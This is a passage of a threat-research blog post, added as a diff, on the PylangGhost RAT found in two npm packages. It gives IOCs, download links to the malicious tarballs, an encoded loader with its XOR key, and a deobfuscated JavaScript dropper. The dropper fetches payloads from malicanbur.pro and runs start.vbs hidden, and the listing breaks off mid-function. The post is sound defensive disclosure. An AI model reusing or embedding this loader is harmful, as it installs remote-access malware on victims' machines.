@@ -1,0 +1,307 @@
+---
+title: First instance of PylangGhost RAT observed on npm
+description: A DPRK/FAMOUS CHOLLIMA-attributed malware historically not observed on npm
+date: 2026-03-13
+tags:
+ - javascript
+ - malware
+ - npm
+ - dprk
+---
+import Summary from "~/components/Summary.astro";
+import Fig from "~/components/Fig.astro";
+import Callout from "~/components/Callout.astro";
+
+import PC from "./images/pylangghost-config.png";
+
+A quick one as I haven't had the will to do full analysis on this as I've
+been exploring something more interesting (more to come).
+
+<Summary>
+* PylangGhost is a RAT first publicly disclosed by [Cisco Talos in June 
+2025](https://blog.talosintelligence.com/python-version-of-golangghost-rat/),
+attributable to FAMOUS CHOLLIMA
+* In late February/early March 2026, two packages published to npm by user 
+jaime9008 (jaimeandujo086[@]gmail.com) distribute PylangGhost RAT
+* This marks the first observed instance of the malware strain on npm, and 
+demonstrates further rapid development during this period
+* IOCs: `malicanbur[.]pro` (domain), `173.211.46[.]22:8080`
+</Summary>
+
+My scanner that supports [my DPRK tracking on npm](https://dprk-research.kmsec.uk/) 
+detected two packages with an obfuscated PylangGhost loader:
+
+| Date | Package | Detected | Download sample |
+|:-----|:--------|---------|-----------------|
+| 2026-03-01 21:19:13.365Z | react-refresh-update v1.0.4 | true | [download](https://dprk-research.kmsec.uk/api/tarfiles/react-refresh-update/1.0.4) |
+| 2026-03-01 21:10:14.297Z | react-refresh-update v1.0.3 | true | [download](https://dprk-research.kmsec.uk/api/tarfiles/react-refresh-update/1.0.3) |
+| 2026-03-01 20:58:10.897Z | react-refresh-update v1.0.2 | true | [download](https://dprk-research.kmsec.uk/api/tarfiles/react-refresh-update/1.0.2) |
+| 2026-03-01 20:34:34.844Z | react-refresh-update v1.0.1 | true | [download](https://dprk-research.kmsec.uk/api/tarfiles/react-refresh-update/1.0.1) |
+| 2026-03-01 20:31:49.975Z | react-refresh-update v1.0.0 | false | - |
+| 2026-02-23 02:06:54.333Z | @jaime9008/math-service v1.0.2 | true | [download](https://dprk-research.kmsec.uk/api/tarfiles/@jaime9008%2Fmath-service/1.0.2) |
+| 2026-02-23 00:33:29.646Z | @jaime9008/math-service v1.0.1 | true | [download](https://dprk-research.kmsec.uk/api/tarfiles/@jaime9008%2Fmath-service/1.0.1) |
+| 2026-02-22 20:00:56.778Z | @jaime9008/math-service v1.0.0 | false | - |
+
+The obfuscated loader is a simple decode -> decrypt -> eval. It contains a hardcoded 
+XOR key, string `fdfdfdfdf3rykyjjgfkwi`. Here's a link to [decode and decrypt the malicious content in CyberChef](https://cyberchef.kmsec.uk/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)XOR(%7B'option':'UTF8','string':'fdfdfdfdf3rykyjjgfkwi'%7D,'Standard',false)&input=QlFzSUZ4SkVOVEEwZWp3K09GbFhTanhFQXdNZEZoZEVTRVpHQUJkRUgxSmJDQkVEQmdNNUd3VUdCUUVWRjBSSVJrWVdVZ1lSU1ZWS1NBZ1ZTVnRKUkFVZURRa1hSRWhHRVI4WUNBb2FDeE1GQTFrYURrWktSRVFwS2xZc0VWNVpTUkVlSGhjVlVWaEdDd1VLRFFVRkNBWVRRVndKR1JaSVJrZEVSQUFBQ0FvTEZnTVVCdzBVYkZCVlMxdEVHQUlLRGhZYUEwWktSRVJMQ2cwSVhSOExEZ2tMQXhVNVNWdEpSRXNMQlFVS0N4WURReE1RR1NaSVJrZEVSQUFBQ0FvTEZnTVVCdzBVSFFBY0J4d0xHUUpFUjFkTEZnVVNCdzRCRlVvY1dnSmJSMWxJR2dZU0NCOE1GVVpLUkVRSENRb1NWaHdOUmhVUEJBQVNBMVZGUmtZSFJrcEVSQ01qWjFCVlMxc0lFeE1ER0VwTFNrUkVTVVJJUmtZVlJ3QWNDaFJJUmtkRURoa05SRWhHUmdNV0ZBc1VFVjVaU1JvZkdBdEpYRmxmWGtwV1JrcEVSRTVKR1ZCVlMxc09DeE1IU1Z0SlJBY0tDeFVCUkVoR0VSUVFCUkFaQWtWS1MxVWRCeFpFU0VaR1N4d0FFVjVaU1ZRcFNFdEdTUVFkQnhZU1NoQUdGVVpLRTFBT0dCb1lBeGNTU1Z0SlJBMEJDZ2tXQTBaS0UxQmJSMWxJSFE0SVdFVkxTa1JFQUFjV0VRMElFVjVaU1ZZY0N4VkpIeG9aU1VaS1JFUUlEd29UUzFCVlMxc1pBa1ZLUzFVQUNBd0RGZzhRUkRsZE9SRVdCUW9lU2dnSEp6c0tEd0FvUkZ0RUZBRVhSaHNMRGxFNVBqVXZKVEE2UFZRN1RWMXVCUXNJUUFaWk1qOENLQkVwS0NaSlcwUVVBUmNSRHhZREd5RXRPVEFrTFRROVdpcEFYVzRGQ3dnWEVrUWRPVkpaR0FrTEhRbHNGbGRVUmhZREZSTU5GQUZPWUNZcklqY3RPVHhVTmw1U2JBY0pDaFVRUmlvVFl3by9DVFF0U2xwR0dSSVlFdzBVQVU0M01qWXZmVFVxTUVvM1ExeHNDQmdIRlJCR1BnUW5IQzg4WkFGWlZsa1lEeFlUQWdVTVRqY3lOaThxSVRjOUJ5OVFVSE1KQlFrVkgxY1JOUXdpSXdzbkRrUmJFd0FjR2d3REdBSk9PQ003THlvaE56MVJPMDFkT1JFV0JRb2VTaVFGSENJdkNDSXpSRnRFTlRBMGVqdytPQ0pjTjF4c0NCZ0hGUkJHQ1NNSEVERVJSQ0JaVmxrNVBqVXZKVEE2UFZNN1gyd0hDUW9WUjFJUkVnd1lQeTgvR1ZkVVJqY3lOaThxSVRjOUN5OUNZUm9GQkJRU1N4QU5LeDBRQ3djRlJsbEdXd3NNR1N3aU14VkdRRmM2TWpZdktpRTNQVjA3RTFsWkJqd0pIRElSSENWSEVnc3FDeEVCRkNjSFFCZFJRbGxCU2pReU9UNG5JVGM5VlZZNVhXNEZYQndLSDFrSkR6NFdBQnNyRFVSYlJBNGRFeFl6ZXlzTFMxSktPVE0wSWprdU5UOVhWVHRFVFVRTGRoRVBQZzRkT0VrU0JEc0dFUUVVSndjWEEweFBFMWxaT0MwNEl5a2hPQ3hZVmpsZGJnVUxDQmNTRXhjNkNEWXdIUk1NUzBwSkRoMFRGak1zUHhaR0dGSXFQeXNqSkNBMU1FWmJPMFJOUkFzaEJSSXpSQVVyUlEwRkpnZ1JEZ1VxQnhjRFRFOUVUVVExWnlBd0pUNDVNVlpXTmt4akJRc0lGeEpFRHdrL1hoNHlIQ3RLVjBjT0VnSWJNeXcvRmtaUFJqY3lZVHMzTENveFcxUTdVSDBLQ1FvVkVFWWlOZzRSVURRVkUxbFhTaWtUT3c4dkJDa2hTZ3dMRHdwT2FSQTZFVEl3UFJSSUh4b1pBZzBVVEU5SVJqY3lZVHMzTENveFcxTTdRa3hqQlFzSUZ4SkVBejAwVlFnYkNSdEtWMGNvSGljUklBWXJJMGdPQ1EwSUd5Z2JLQU1oTURBVlJRTUVGZ0FQRms1TlNrUTFaeUF3SlQ0NU1WWlRObDVTYkFVVkhRZ0hSZ0lUWFJFTkFoWUVTZ2dnR1NNSEZTMHJUQjR1QUJVVlZ5c3RSMWt6SXlFWFBpWURKVWhHQnc0UkNBODFXZ2djUzBSS1cxZEdRVmRZVmxaU1JFeEVWMVJVQjF0WkVITktTZ3NESDFjSUloTVZBQk1BUEVSYkUwSkNZVmxLSGhVZlN3eGpSa1JHUkFVTENCY1NFeW9wR1RRTU1oRWtTMHBKQnhNSERSSkVIamNPZHpVVUtCRkVBZ0lIRDE4UkxBSVhGd0k5TWsxZE9WSlpTMWtMTGhBVkR3SU5QRVJiUkJZRkZCY0RlaHdOUXlFNkdDb0FNd0VyU0F3REJRSUJGQmM5WUNZcklqY3RPVHhYWFNvMFNrUlhWRTlmYkVSR0UxSVZEZzFLSFE0SExnMG1QQTVHV1VaVVhXNUdFMUpaQWg5S1FqNGdBelVmS1NjM1NnTWNEeGNTUUNFQUJScENNeTRnR2lJNERDZFBUVVlmYkVSR0UxSlpTeG9GQkJRU1N6VWpLaUFlSUM4Q1JsbEdhalFSS1E4bEtUWklHQU1JRWpjZkNnVk1QeTBnUWljb0FUcERVVzFHUzFkSlJrUVJEUWNoSENzOFdWSkVTenNnSmlNZUx6NFBTQmNQSGdOZmJFUkdFMUlFWVZsS1NrY0ZCQmthRWtRcERDSXVIeXdBZlZKRVN5QXNBaVVRSkRRNFNBY1VBUWNRQXpNVVdnWWNPQTBZRHdZTFF5NGdJQlV6TlF3blNrUWRPVkpaUzFsS1NnRUtDaEFhWEVRMU1EUXRLQ00xYUVOT05uTktTa2RHRmw1U2JFUkdSRVlURGcwS1ZsSlJIQkFMTHgwcE1SMUpXa1FISUJFWEFoRUNhVnRaRUhOS1NrZEdTMWNLQ1FvVkVFWTJGQ0lXV2dvU00xbFhTaW9ISHg5SEN3MElUQkVOQnlFY2ZDZ1RTMUpLQ1E4VEJSdzZEeDREUkV0RVYwaEdVallPR0IwZkRqMUdSbGRZVDE5c1JFWkVSa1JHUndBQVN3SmdTa2RHUzFkSlJrUUZDd2dYRWtRZlpCRXFFajQ0QzBkYlN4WWVCdzBTUkI0M0RpQWhYakVSUXdKZ1NrZEdTMWRKUmtSR1JCTVdDbDVHU3pnZkdnb09Nek5LWVZkSlJrUkdSRVpFUmtRTFZnWVJCQjFRU2pReU9UNG5JVGM5VlY0NVNtNUdFMUpaUzFsS1NrZEdBeElJQWdFVUYxeEVIVzVHRTFKWlMxbEtTa2RHUzFjN0J3b0JBVnhFTlRBMGVqdytPQ0piVXpwR1FGY2VEd1VqSGlrK0RFUk5FeUV0T1RBa0xUUTlXVWMwUms5R05oUWlGZzBlV0NwelMxbEtTa2RHUzFkSlJobEtia1pFUmtSR0UxSlpTMWtZRHhRV0JCa2FBekFmRkFOZVJqY3lZVHMzTENveFdGWTdZVmRKUmtSR1JFWkVHMDFkT1ZKWlMxbEtTa2RHQ2dBSUR4QkdDZ01UUmpRVVhCOFFHQnhDUWlvV0h5WXNJd1VXU0VZTk15Z3hVZ002RFZCS1YxbEdFSDFKUmtSR1JFWkVSa1JHU2lVYU9BQXRPQVpJRHhZZEIwb1dEUllCVGlzT2R6Z0FJeDhrUmtjZFlWZEpSa1JHUkVaRVJrUkdFeGNYRDBOS0RBWUtHQkpqUmtSR1JFWkVSa1JHRXc5UVVITktTa2RHUzFkSlJrUkdIVEVITlIwaFlSTlhEeGdlQzBrSkJWODZNall2S2lFM1BWWlVibDVaSmdrZU95SWpDZ2RBWFc1R1JFWkVSa1JHRTFKWkVpNEpPUjRoT1JaSEFnVVNCVWdMQ0V3MVp5QXdKVDQ1TVZWVk5sdEpEekVxTXdjVkpRSlBDSGhaUzFsS1NrZEdTd3BBWFc1R1JFWkVSa1JHRXdVUUNqd1FKVDBNUzBwSk5CWWdGQThjRFR4R0dGSklVSE5LU2tkR1MxY1VSZ2NIRUFVTVJrd0RRUUFXR1ZCS0VScHNTMWRKUmhsc1JFWkVSaXNPZHpnQUl4OGtSQVFLQkFRTVRrMWRia1pFUmtRdlVCd05KQm9TTFU5UFVIMUpSaGxHQndjUUJReEdHeGNMR1JZWVEwY2RGbjBVYkFJVENnVVFEd3NJRXhvb0VSZ0JJQ1FQUXdVTUVoWTVIU1VMRXdvU0UwOVpYbEJLRVcxR1N4UUdDQmNTUkRNUENESVZkendPUzBSS015RU9LUUVtSlRWSUJ4UUJCeEFEWkFBUUh4dzVIaFVEQ2hwQklEUU1Fd1VpQ2h4UENIaFpTeG9GQkJRU1N5MGtKd2szQ2k0R1JsbEdTSGhaUzFsS0FnSUhEeEliRlY1R0gyeEVSa1JHRTFKYlBnb1BHRW9uREJJSEVrWmNSRFV3TkMwb2RDRWlXVTAzUm0xR1MxZEpSa1FuQndVQkZoQmNFeUV0T1RBa0xUUTlXVUkwYkVSR1JFWVpiRVJHVGtselMxa0pCUWtWSDFjVEZCRWxFUzhnTTBSYkV4MFlKelVKQXdNb1JSQU1Fa3dQQ1Q4SkNpOFJZVjVaTVRRckJ6WUlJeFZGUmdJVENnVVFEd3NJRTFvTERnb2FCUWtWRGw1SkhXNUdSRVpFRHdKR0d3QWNHQWtGQkJRRFJRUWRCeEFURnlVTEFnRkdFazlFUzB0YVdrNUdFSDFKUmtSR1JFWXhEUW93UURZM0hGY0pCZ2dWRGw5QlQwUmJXa1lmYkVSR0UxSlpTMWxLTXlFT0tRRW1KVFZJRVFnSUR3b05ZQXNYQ0ZFc09nMFJDREVGSGsxZGJrWkVSa1JHRXc5UVVITktTa2RHUzFjQUFFUk9GZ01RRkRzZmNCME1CUTFLVkVkV1FsY1NiRVJHUkVaRVJrUkdXeU1EQ2hJZ0tRNU9HUklkRkRzZkp3a1JDQkJHSGxKSVFrSmdTa2RHUzFkSkcyNUdSRVpFUmtRVVZnWU1HUmRSWUVkR1MxY1ViRVJHUkVZSENRb1ZSMUlzR3lzcEl6ODBEVmRVUmhRSEZoVUJMd29TR3dBY0dBa0ZCQlFEUlI4TUJ3QURGaFUvTlRBMGVqdytPQ0piWERvN1IxZFlWazFkYmtaRVJrUUtWZ1paT2dBRUt4NExCalpKVzBSV1gyeEVSa1JHUVJjS0d4WUVHUUpJQkJsQk5UQTBMU2dqTlQ5VUJTOVZTd0V6TEE4ekJ6MFFSbGxZUkIxdVJrUkdFMUpaT2dBRUt4NExCalpKVFZsR0hEOGlEakVLZVF0WEJ4d0VEUk1PVUgxSlJrUkdHVTlmYkVSR0UxSUxEZ29hQlFrVkRsa1pEeFFEVERNUENESVZkendPUWtKZ1NrZEdTd1VNRlJRSkNoVUJTQXNJR3lFdE9UQWtMVFE5V1VVMFNrUk9UVVpaV0VRZE9WSlpTMWxLU2pJTkJTRWFJaW9SU2dVSUNSY0RHMXBRUzBSVVNoeHNTMWRKUmtSR1JFWU5BRVJPWWdzWEtnQUhCeVpHVmtwVVJqRVdOaVV0UGpZQUdsSUNZVmxLU2tkR1MxZEpSa1F2QndnUUtRY2VkRnBRVUhOS1NrZEdTMWRKUmhsR0FRb1hBMFFQVlZKUkdSd2VHRGdmS0JnY0NCQkdXa1pVVDBRZE9WSlpTMWxLU2tkR1MxY3dJQXdrRWlrbk4wb1RYUjRRQlJKQ0xEY01IQlF2Q2h4S1JBZ0RLREVrUWhVN1MwUlVTaHhzUzFkSlJrUkdSRVpFUmtSR1doUlpRMWdFRFNrektRWU9KRTFHRERjZUJ3OHNjQnRSR1J3ZUdEZ2ZLQmdjQ0JCR1NVWlZUMTlzRTFKWlMxbEtTa2RHU3dwQVhXNUdSRVpFUmtSR0V3OVpEaFVaRDBjZEZuMUpSa1JHUkVZWlQxOXNFMUpaU3dSRFVXMUdTMWRKRkFFVkZBa0tGUUZJWEJ4Uk9DMDRJeWtoT0N4YlVUbEtSRTVOUmxsWUV3a0VRa0pnU2tkR1N3VU1GUlFKQ2hVQlNBc0lHeUV0T1RBa0xUUTlXVVEwU2tRREZoUkVXMXBHU0hoWlMxbEtTa2N6QUJrL0ZTQW9FMGdIQ2dzVlZscFJRbGxYVkVjZFlWZEpSa1JHUkVaRVB5SU9jUVEyS0NoRUh3a0tBaGtDVGlJMkRoRUhJQWdlSDFJYUdBMHVNQ1lGS0ZkVVdFUWRia1pFUmtSR0UxSlpTMWtEREVkT0NBUWRJajRuQnlWTlJoOGJPVkpaUzFsS1NrZEdGbDVTYkVSR1JFWkVSa1JHV2hSWlF3c1BIaFU1RWpRR0V3b1NSRmhFVmsxR1NIaFpTMWxLU2tkR1MxZEpEalVjQlEwdUpRMU9RUmNOR1NZVEtRZ1RCUU5KUzBSWFRWMXVSa1JHRTFKWlMxa1hZRWRHUzFkSlJobFBYMnhFUmtSR1RsdENZVmxLRjA1ZFlWZEpIQllUSnhNdElqRklYQnhST0MwNEl5a2hPQ3hiVlRsS1JBTVdGRVJiRFZJQ1lWbEtTa2N6QUJrL0ZTQW9FMGdIQ2dzVlZscFJRbGxYVkVjZFlWZEpSa1JHUkQ4aURpWVFmREVvUlF3RUJnNElBRjh2Tmc0UkJ5QUlIa2hHUmh3VkFoY0JMeFVVUzBwWFJoOXNSRVpFUmtSR0UxSVFEVmxDSHdrS0Foa0NJeFlVVFVZZkcyNUdFMUpaUzFrWFExeHNTMWRKUmtSR0RRQkVUaFlEUndBbUVqb0ZId2tTUzBsSlZrMUdIMnhFUmtSR0UxSlpTeEU3RUFZTklUUUFUaFlERUJRN0h5Y0pSaHdOUzFSS1cwNWRZVmRKUmtSR1JCdHVSa1JHRXc5UVVITktTaHBQVUgxSlJoNFVFU1VSTHlBekhRRWNIeTBEQndJSkhnTkJWVlJXVkZaSVJreFBFMDlIU3dKZ1NrZEdTdzBiRXljVExTSXhTQVVFWEFBTlExQlJZRWRHUzFjOERRb3dGeUlxRVVvRlh4MEtEbEZDUTBkYlZWY1NiRVJHUkVaRVJqMGdXekFQSkRvN1JCSUlCeDRIRFV3Z05Bd1RCU0lLUzE1WkhoY0dBd2tOTGdVYlJsbFlSQjF1UmtSR0UxSlpTMWtEREVkT0hoa0ZEd29OSVJRV1QwUWRUbmhaUzFsS1NrY2JRa3hqUmtSR1JFWkVEd0pHR3dBY0h3czFFeVFKSGhrZFJscEdWRTlFSFc1R0UxSlpTMWxLU2c4M0VSWUNMQ2NQVEJRQkVoWTVTakVXSGhjZVNrcEdXbDVTYkVSR1JFWkVSaGxzRTFKWlN3UkRVVzFHU3dwQVhXNUdSRE1QQ0RJVmR6d09SUllFUWpReU9UNG5JVGM5Vmw0NVNrUk9HbEpFVlZrUkYwNWRZVmRKTXc4SU1oVWdLQk5JWEJ4Uk9DMDRJeWtoT0N4YlVUbEtSRTVOUmxsWUV3a0VRa0pnU2tjekFCay9GU0FvRTBnTENFdzFaeUF3SlQ0NU1WVlZObHRKQXhZVVJGdGFSaDlzRTFKWlN5QXNBaVVRSkRRNFNCRUlDQThLRFV3Z1l4Z09DRDhHRWt0R0hoa0ZEd29OSVJRV1JsbFlFd2x6UzFsS1NrZEdBaEZKVGhFSUNBOEtEU0VVUVZ0WkVBUmdTa2RHUzFkSkR3SkdUQlFCRWhZNVNqRVdIaGNlU2xsR1cxNUpIVzVHUkVaRVJrUkdFeG9vRVJnQklDUVBRd1VNRWhZNUhTVUxFd29TRTE5WldsQlJZRWRHUzFkSlJobHNSRVpFUmhsUENIaFpTd1JEVVcwYllSRWNDQWNTRFFrS1JpMEZYUVkyQ0FFdFFrNUdFSDFKUmcwQVJFNUZQeUlPY1FRMktDaEVEeDhQR0FNYU5SMElCMDRCUHpZQVNSQWJDVkJEU2h4c1MxZEpSajBnRENRU0tTYzNIUjhTRHhBWU9SNElDRjhNUHpZQUhnUUdCRTFkT1ZKWkZuTktTZ1FKQlFRZFJqTXBIQVFMQ3dzM0UwOVpHQWtMSFFsT09DTTdMeW9oTnoxV1h6bEtFeWtxUHlzakpDQTFNRVJaTzBoR0lqWU9FUWNnWHdwVlN5bytPQzRvTENReVZWVTdTRVlCUHpZQVNSQWJDU1JEVVcxR1N5QW1IZ1lKQ1FrMVNBc0lHeUV0T1RBa0xUUTlXVUEwU2tRSE1TTU9QeEl6U2xKRVZWa1JZRWRHUzFjQUFFUk9CVE1oREQwUVpndFpWa1JYU2xkUFN3eGpSa1JHUkVaRUlpZ0laaUFkRFRWQ1ExeHNTMWRKUmhsR0FRb1hBMFFkVG5oWlN3UkRVVzBiWVJFY0NBY1NEUWtLUmlBcVhTY3JEeDhtUWs1R0VIMUpSZ2NKQ2hVUVJpazBVaGc0QmlnbVNscEdKUUk1SGlJRUtTRktEQXNQWFZvY01pc01FQVVFQ1Z0Sk5UQTBMU2dqTlQ5VkFTOVFVSE5LU2c0QVMxOHdJQXdrRWlrbk4wb0RTeHNLSHdvNUV3a0ZRem83Qnc0bkNUY29UMDFHU0hoWlMxbEtDUWdJR0FOSkpRY2tJU295S2lKR0RsSUtHeGdkQkU4MVB5VWdLQ00xUDFWWE8waEdhRDhyQ2hNckJ6WXFObHRKSFc1R1JFWkVSa1FDVmdZWUNCRVBEbDFHSHdVY0EwaHNSRVpFUmtSR1FBWWRBaFpRU2pReU9UNG5JVGM5VjFJNVNtNUdFMUpaUzFrZEF3a0NCQUFhTGcwQ0FWeEVFaFlUVm5oWlMxbEtGMDVkWVZkSlJrUWxCeVFoS2pJcWRWd01CUXNQREU5UFVIMUpSaGxHQVFvWEEwUWRUbmdFWVI4ZkJBUVNBaGdIUmdFckpRb1JFQTBuRzF0WkVITktTZ3NESDFjUkxDb0FNVFFEQ1VSYkV5RXRPVEFrTFRROVdFSTBYVzVHUkFVTENCY1NFem90Q1NNK0V3c0xTMHBKUEFZbEhpMCtNUmRJUXg0WUh4OEZHQXBPUWt4alJrUUtBUkpFS1NrK1J4b1BIaHBLVjBjMVB5VWdLQ00xUDFWUk8xOXNFMUlRRFZsQ0lqTUVNU01RQ2dsR1dWdFpSamN5WVRzM0xDb3hXVkU3UWxjU2JFUkdSRVlIQ1FvVlIxSVREaDBQSFF3Z0ExZFVSajRFSnh3dlBETVZIUVlVR3gwREdFOVBVSDFKUmtSR0t5czhFZ3dRUmhGWlZsa2tIemNlTFJVa0lVb01DdzhLVGc0RFZ4Y09BRDhDUmtjbENBQThJQW9nTVU5ZmJFUkdFMUlCSVRjTVB6VUJCRmRVUmdNQ0tSOFNDUVVIQ0hoWlN3UktEd3NWRGxjQUFFUk9MRElHUERBZlh4OVpWa1JYU2pReU9UNG5JVGM5VjFFNVQwUWRPVkpaUzFrbEp6OFNBd0VjQlVSYlJEVXdOQzBvZENFaVdFRTNTa3hHS0JRZU15SUlJak5mYkVSR0UxSUJJVGNNUHpVQkJGZFVSZ0VsQnlrK0VSQU1DSGhaU3dSS0R3c1ZEbGNBQUVST0xESUdQREFmWHg5WlZrUlhTalF5T1Q0bklUYzlWMTg1VDBRZE9WSlpTMWtsSno4U0F3RWNCVVJiUkRVd05DMG9kQ0VpV0VFM1NreEdLQlFlTXlJSUlqTmZiRVJHRTFJQklUY01QelVCQkZkVVJnY0RQUllQQ2lZTkNIaFpTd1JLRHdzVkRsY1NiRVJHUkVZV0F4QVRRUnhDWVZsS0YyMUdTeDRQUmt3dU1BUStNaDBLWGxKWVZsazVQalV2SlRBNlBWZFFPVTlFSFc1R0UxSlpCQmdtSmdRUER6bEhBUUVTVEI0dUtBSXpZUlVXUjFrUllFZEdTMWRKUmhZRERnTUhFakVJVWdjTkF4WVlBeDBERDAxSkFBVUtGd051UmtSR0V3OVZTd2dlUFRNL0NCVTdSbGxZUkIxdVJrUkdFMUpaQ0JZRUdSTkdKQzhPQUN3MkNpOUVXMFEvZFJvN0hUWXBPMGtGR1JJSUVnRXhGZzhRQXpjU1FSY1lCbEVsSno4U0F3RWNCVTFkYmtaRVJrUkdFd01OUEMwekNRVTBSUWNBRmdGT0t6NERBQ3cyWFR0UVVITktTa2RHUzFjbVBnTUFMRFlLTDBvSlhWb3FQeXNqSkNBMU1FVlJPMGhHVEU5RVcxcEdTSGhaUzFsS1NrZEdTemd4QVFJdU5BZ3RTQWNLWEFFY1ExRkRTbHBZU3d4alJrUkdSRVpFUmtSR0V5cy9BenNjSlNRM1JSUUJDd3NDTng4S0JVd3BmaW9OQXc4ZkNVdEdXeGhlVTFGUFgyeEVSa1JHRTFKWlMxbEtDUWdJR0FOSkNTVVBEd01NUEFWR0RsSTJKaUVlQWhFVENFeGpSa1JHUkVaRVJrUkdFeEVXQlFvZVNqWVNMallqSlFVSFJGdEVGUlFIUkJ4Uk9DMDRJeWtoT0N4ZFZqbEtSRDBMSncwTlZob2pDaVJHU2h4c1MxZEpSa1JHUkVaRVJrUkdRQVlkQWhaUVNqUXlPVDRuSVRjOVVGYzViRVJHRTFKWlMxbEtTa2NiUWt4alJrUkdSRVpFUmtSR0V5TU5MamdnS1FZSFJSZ0hUamN5Tmk4cUlUYzlBVVVrUjFrSkJRTURTMHBYUmg5c1JFWkVSa1JHRTFKWlMxbEtHaFVKQ0JJYUZVb0RIQThRVGdjSlZ4ZFFVSE5LU2tkR1MxZEpSa1JHR1U5ZmJFUkdFMUpaUzFsS1NrYzNIeklvTENjSEJVZ0xDRXcxWnlBd0pUNDVNVlZWTmx0SkF4WVVSRnRhUmg5c0UxSlpTMWxLU2tkR1MxZEpGaFlKQndNWEZVb0RTeHNOUTBoRFVXMUdTMWRKUmtSR1JFWkVHMDFkT1ZKWlMxbEtTa2RHRmw1U2JFUkdSRVpFUmhsUENIaFpTMWxLRjA1SUJCbEJOVEEwTFNnak5UOVVBQzlWU3hvRkJCUUpCeEpIQXhZVUN4Uk5YVzVHRXc5WkRoVVpEMGNkWVZkSlJrUUpJaFF3Q0JjdmZsb2VEelFUSEFnSENsdEpJRFFNRXdVaUNoeFBDSGhaU3dSZ0YyMERKallGRXhJUEpVNU5YUT09).
+
+<Callout type="info">
+The XOR key string `fdfdfdfdf3rykyjjgfkwi` is consistent with mashing the keyboard on 
+an ANSI layout-like keyboard :)
+</Callout>
+
+This decrypted content is slightly obfuscated with renamed function names and 
+array-index variable redirection, which you can see by clicking the link to 
+CyberChef above. I asked Gemini to refactor this code, here are the results --
+all comments preserved from Gemini, my hands are washed of any blame for its 
+idiosyncrasies:
+
+```javascript
+const https = require("https");
+const fs = require("fs");
+const { spawn } = require("child_process");
+const path = require("path");
+const os = require("os");
+const axios = require("axios");
+
+// --- Configuration & C2 URLs ---
+const macPatchScript = "macspatch.sh";
+const campaignId = "ML2J";
+const c2Domain = "https://malicanbur.pro";
+
+// Generates target URLs based on OS and campaign ID
+const winPayloadUrl = c2Domain + "/winnmrepair_" + campaignId.toLowerCase() + ".release";
+const linPayloadUrl = c2Domain + "/linnmrepair_" + campaignId.toLowerCase() + ".release";
+const macPayloadUrl = c2Domain + "/macnmrepair_" + campaignId.toLowerCase() + ".release";
+const fallbackWinUrl = c2Domain + "/winnmrepair.release";
+
+// Temporary paths for downloading and extracting payloads
+const zipFilePath = path.join(os.tmpdir(), "patches.zip");
+const extractDirPath = path.join(os.tmpdir(), "patches");
+
+// --- Core Functions ---
+
+// Downloads a file in chunks, likely to bypass basic network scanning limits
+async function downloadChunked(url, destPath, chunkSize = 10 * 1024 * 1024) {
+  let totalSize = 0;
+  try {
+    const headResponse = await axios.head(url);
+    totalSize = parseInt(headResponse.headers["content-length"], 10);
+    let downloadedSize = 0;
+    
+    // Resume download if file already partially exists
+    if (fs.existsSync(destPath)) {
+      const fileStat = fs.statSync(destPath);
+      downloadedSize = fileStat.size;
+    }
+    
+    // Open stream in append mode ("a")
+    const fileStream = fs.createWriteStream(destPath, {
+      flags: "a"
+    });
+    
+    // Download remaining chunks
+    while (downloadedSize < totalSize) {
+      const endByte = Math.min(downloadedSize + chunkSize - 1, totalSize - 1);
+      try {
+        const chunkResponse = await axios({
+          url: url,
+          method: "GET",
+          headers: {
+            Range: "bytes=" + downloadedSize + "-" + endByte
+          },
+          responseType: "stream"
+        });
+        
+        await new Promise((resolve, reject) => {
+          chunkResponse.data.pipe(fileStream, {
+            end: false
+          });
+          chunkResponse.data.on("end", resolve);
+          chunkResponse.data.on("error", reject);
+        });
+        downloadedSize = endByte + 1;
+      } catch (error) {}
+    }
+    fileStream.close();
+    extractAndRunPayload(); // Trigger execution after download completes
+  } catch (error) {}
+}
+
+// Fallback downloader if the chunked download fails
+function downloadFallback(retryCount = 5) {
+  const fileStream = fs.createWriteStream(zipFilePath);
+  const requestOptions = {
+    headers: {
+      "User-Agent": "curl/7.68.0", // Spoofing curl
+      Accept: "*/*"
+    }
+  };
+  
+  const request = https.get(fallbackWinUrl, requestOptions, function (response) {
+    if (response.statusCode !== 200) {
+      fileStream.close(() => {
+        fs.unlinkSync(zipFilePath);
+      });
+      if (retryCount > 0) {
+        downloadFallback(retryCount - 1);
+      }
+      return;
+    }
+    
+    const expectedSize = parseInt(response.headers["content-length"], 10);
+    let actualSize = 0;
+    
+    response.on("data", chunk => {
+      actualSize += chunk.length;
+    });
+    
+    response.pipe(fileStream);
+    response.on("end", () => {
+      fileStream.close(() => {
+        if (actualSize === expectedSize) {
+          extractAndRunPayload();
+        } else if (retryCount > 0) {
+          fs.unlink(zipFilePath, err => {
+            if (!err) downloadFallback(retryCount - 1);
+          });
+        }
+      });
+    });
+    
+    response.on("finish", () => {});
+    response.on("error", err => {
+      fileStream.close(() => {
+        fs.unlink(zipFilePath, err => {});
+        if (retryCount > 0) {
+          downloadFallback(retryCount - 1);
+        }
+      });
+    });
+  });
+  
+  request.on("error", err => {
+    fileStream.close(() => {
+      fs.unlink(zipFilePath, err => {});
+      if (retryCount > 0) {
+        downloadFallback(retryCount - 1);
+      }
+    });
+  });
+  
+  request.setTimeout(30000, () => {
+    request.abort();
+    fileStream.close(() => {
+      fs.unlink(zipFilePath, err => {});
+      if (retryCount > 0) {
+        downloadFallback(retryCount - 1);
+      }
+    });
+  });
+  
+  fileStream.on("finish", () => {});
+  fileStream.on("error", err => {
+    fs.unlink(zipFilePath, err => {});
+    if (retryCount > 0) {
+      downloadFallback(retryCount - 1);
+    }
+  });
+}
+
+// Extracts the downloaded ZIP archive using the system's tar utility
+function extractAndRunPayload() {
+  if (!fs.existsSync(extractDirPath)) {
+    fs.mkdirSync(extractDirPath);
+  }
+  
+  const tarProcess = spawn("tar", ["-xf", zipFilePath, "-C", extractDirPath]);
+  tarProcess.on("close", exitCode => {
+    if (exitCode === 0) {
+      executeWindowsPayload();
+    }
+  });
+}
+
+// Executes the VBScript payload silently in the background
+function executeWindowsPayload() {
+  const vbsPath = path.join(extractDirPath, "start.vbs");
+  if (fs.existsSync(vbsPath)) {
+    const wscriptProcess = spawn("wscript", [vbsPath], {
+      detached: true,
+      stdio: "ignore",
+      windowsHide: true // Run invisibly
+    });
+    wscriptProcess.unref(); // Detach from parent process so Node can exit
+  }
+}
+
+// Main entry point determining execution flow based on operating system
+function main() {
+  let targetUrl = "";
+  const platform = os.platform();
